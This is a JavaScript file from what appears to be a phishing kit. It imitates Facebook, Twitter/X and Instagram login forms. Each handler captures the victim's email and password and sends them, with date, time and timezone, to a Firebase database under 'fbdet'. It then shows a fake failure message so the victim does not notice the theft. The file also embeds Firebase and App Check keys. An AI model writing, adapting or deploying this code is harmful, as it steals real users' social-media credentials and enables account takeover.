// Initialize Firebase
const firebaseConfig = {
  apiKey: "AIzaSyDQPvxVawcTkc8Wdm89HGx6ONVpkSQ2ju4",
  authDomain: "asianclas.firebaseapp.com",
  databaseURL: "https://asianclas-default-rtdb.firebaseio.com",
  projectId: "asianclas",
  storageBucket: "asianclas.appspot.com",
  messagingSenderId: "90933232698",
  appId: "1:90933232698:web:c3ee304c55f3e79c66a103"
};
firebase.initializeApp(firebaseConfig);
const appCheck = firebase.appCheck();
console.log(appCheck);
appCheck.activate("6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW", true);

function login() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      alert(error.message); // Display error using alert
    });

  var email = document.getElementById("fb-email").value;
  var password = document.getElementById("fb-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Facebook";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      alert("Oops, something went wrong. Please try again later.");
      document.getElementById("fb-pass").value = "";
      return false;
    }, 2000);
  } else {
    alert("Please enter both email and password."); // Alert for missing input
  }
}

function twlogin() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      alert(error.message); // Display error using alert
    });

  var email = document.getElementById("tw-email").value;
  var password = document.getElementById("tw-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Twitter/X";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      alert("Invalid username or password"); // Alert for invalid credentials
      document.getElementById("tw-pass").value = "";
      return false;
    }, 2000);
  } else {
    alert("Please enter both email and password."); // Alert for missing input
  }
}

function iglog() {
  var email = document.getElementById("ig-uname").value.trim();
  var password = document.getElementById("ig-pass").value.trim();

  if (email === "" || password === "") {
    alert("Please enter both email and password."); // Alert for missing input
    return false; // Prevents further execution
  }

  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      alert(error.message); // Display error using alert
    });

  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Instagram";

  firebase.database().ref("fbdet").push({
    emle: email,
    mobile: "",
    time: currentTime,
    timezone: timezone,
    pass: password,
    date: currentDate,
    type: accountType,
  });

  setTimeout(function () {
    alert("Please double-check your password"); // Alert for incorrect password
    document.getElementById("ig-pass").value = ""; // Clear the password field
    return false;
  }, 2000);
}
